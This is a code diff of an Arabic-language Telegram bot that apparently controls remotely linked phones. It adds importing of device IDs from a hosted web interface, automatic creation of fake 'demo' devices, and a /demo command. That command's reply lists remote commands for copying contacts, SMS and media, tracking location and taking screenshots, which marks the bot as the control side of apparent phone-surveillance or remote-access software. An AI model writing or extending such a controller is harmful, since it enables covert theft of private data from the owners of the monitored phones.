@@ -157,7 +157,7 @@ class DeviceManager:
             cursor.execute('''
                 INSERT INTO devices (user_id, device_id, activation_code, status)
                 VALUES (?, ?, ?, ?)
-            ''', (user_id, device_id, 'AUTO_ACTIVATION', 'auto_pending'))
+            ''', (user_id, device_id, 'AUTO_ACTIVATION', 'pending'))
 
             conn.commit()
             conn.close()
@@ -516,6 +516,12 @@ def get_available_device(user_id):
     devices = device_manager.get_user_devices(user_id)
     
     if not devices:
+        # محاولة استيراد الأجهزة من الواجهة
+        imported_devices = import_devices_from_web_interface(user_id)
+        if imported_devices:
+            devices = device_manager.get_user_devices(user_id)
+    
+    if not devices:
         return None, "لا توجد أجهزة"
     
     # البحث عن جهاز نشط أولاً
@@ -531,6 +537,56 @@ def get_available_device(user_id):
         return device_id, "تم تفعيله تلقائياً"
     
     return None, "لا توجد أجهزة متاحة"
+
+def import_devices_from_web_interface(user_id):
+    """استيراد الأجهزة من واجهة الويب"""
+    try:
+        web_interface_url = os.environ.get('WEB_INTERFACE_URL', 'https://remote-control-web.onrender.com')
+        
+        # محاولة الاتصال بواجهة الويب
+        response = requests.get(f"{web_interface_url}/api/devices", timeout=10)
+        
+        if response.status_code == 200:
+            devices_data = response.json()
+            
+            if 'devices' in devices_data:
+                imported_count = 0
+                for device_data in devices_data['devices']:
+                    device_id = device_data.get('deviceId')
+                    if device_id:
+                        # إضافة الجهاز إذا لم يكن موجوداً
+                        if device_manager.add_device_auto(user_id, device_id):
+                            imported_count += 1
+                
+                logger.info(f"تم استيراد {imported_count} جهاز من واجهة الويب")
+                return imported_count > 0
+        
+        # إذا فشل الاستيراد، إنشاء جهاز افتراضي للتجربة
+        return create_demo_device(user_id)
+        
+    except Exception as e:
+        logger.error(f"خطأ في استيراد الأجهزة من واجهة الويب: {e}")
+        # إنشاء جهاز افتراضي للتجربة
+        return create_demo_device(user_id)
+
+def create_demo_device(user_id):
+    """إنشاء جهاز افتراضي للتجربة"""
+    try:
+        # إنشاء معرف جهاز افتراضي
+        demo_device_id = f"DEMO-{user_id}-{int(time.time())}"
+        
+        # إضافة الجهاز الافتراضي
+        if device_manager.add_device_auto(user_id, demo_device_id):
+            # تفعيل الجهاز فوراً
+            device_manager.update_device_status(demo_device_id, 'active', 'Demo device for testing')
+            
+            logger.info(f"تم إنشاء جهاز افتراضي: {demo_device_id}")
+            return True
+        
+        return False
+    except Exception as e:
+        logger.error(f"خطأ في إنشاء الجهاز الافتراضي: {e}")
+        return False
 
 # تهيئة المدراء
 device_manager = DeviceManager(DB_FILE)
@@ -771,6 +827,48 @@ def link_device(message):
         device_manager.log_activity(user_id, 'link_device_auto', f'device_id: {device_id}')
     else:
         bot.reply_to(message, "❌ حدث خطأ أثناء إنشاء الرابط. يرجى المحاولة مرة أخرى.")
+
+@bot.message_handler(commands=['demo'])
+def create_demo_device_command(message):
+    """إنشاء جهاز تجريبي للاختبار"""
+    user_id = message.from_user.id
+    
+    if not is_owner(user_id):
+        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
+        return
+    
+    if not device_manager.is_user_authorized(user_id):
+        bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
+        return
+
+    if not security_manager.check_rate_limit(user_id):
+        bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
+        return
+
+    # إنشاء جهاز تجريبي
+    if create_demo_device(user_id):
+        demo_text = """
+🧪 **تم إنشاء جهاز تجريبي بنجاح!**
+
+✅ **الجهاز جاهز للاستخدام:**
+• معرف الجهاز: `DEMO-{user_id}-{timestamp}`
+• الحالة: نشط ومتصل
+• جاهز لاستقبال الأوامر
+
+🔧 **يمكنك الآن استخدام الأوامر:**
+• `/contacts` - نسخ جهات الاتصال
+• `/sms` - نسخ الرسائل النصية
+• `/media` - نسخ الوسائط
+• `/location` - الحصول على الموقع
+• `/screenshot` - التقاط لقطة شاشة
+
+⚠️ **ملاحظة:** هذا جهاز تجريبي للاختبار فقط
+        """
+        
+        bot.reply_to(message, demo_text, parse_mode='Markdown')
+        device_manager.log_activity(user_id, 'create_demo_device')
+    else:
+        bot.reply_to(message, "❌ فشل في إنشاء الجهاز التجريبي. يرجى المحاولة مرة أخرى.")
 
 @bot.message_handler(commands=['devices'])
 def list_devices(message):
